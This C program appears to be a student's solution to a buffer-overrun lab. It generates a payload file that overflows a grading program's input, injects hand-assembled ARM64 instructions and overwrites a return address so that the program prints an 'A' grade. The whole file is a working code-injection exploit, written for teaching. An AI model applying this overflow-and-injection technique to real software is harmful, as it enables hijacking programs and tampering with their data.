#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/mman.h>
#include "miniassembler.h"


int main(void){
    int i;
    unsigned long uiData;
    FILE *psFile;
    unsigned int adr;
    unsigned int mov1;
    unsigned int mov2;
    unsigned int strb;
    unsigned int b;
    unsigned int bl;
    /*address where grade='B'*/
    uiData = 0x420068;
    /* mov x0, "A" */
    mov1 = MiniAssembler_mov(0, 0x00000041);
    /* bl printf */
    bl = MiniAssembler_bl(0x400600 ,0x42006C);
    /* adr x0, [sp, grade] */
    adr = MiniAssembler_adr(0, 0x420044, 0x42006C);
    /* mov w1, "A" */
    mov2 = MiniAssembler_mov(1, 0x0000002B);
    /* strb w1, [x0] */
    strb = MiniAssembler_strb(0, 1);
    /* b printf */
    b = MiniAssembler_b(0x400864, 0x420074);
    
    psFile = fopen("dataA", "w");
    
    fprintf(psFile,"Chris Paucar");
    
    for(i = 0; i < 4; i++){
        putc('\0', psFile);
    }
    
    fwrite(&mov1, sizeof(unsigned int), 1, psFile);
    fwrite(&bl, sizeof(unsigned int), 1, psFile);
    fwrite(&mov2, sizeof(unsigned int), 1, psFile);
    fwrite(&adr, sizeof(unsigned int), 1, psFile);
    fwrite(&strb, sizeof(unsigned int), 1, psFile);
    fwrite(&b, sizeof(unsigned int), 1, psFile);

    for(i = 0; i < 9; i++){
        putc('\0', psFile);
    }

    fwrite(&uiData, sizeof(unsigned long), 1, psFile);
    fclose(psFile);
    
    return 0;
}
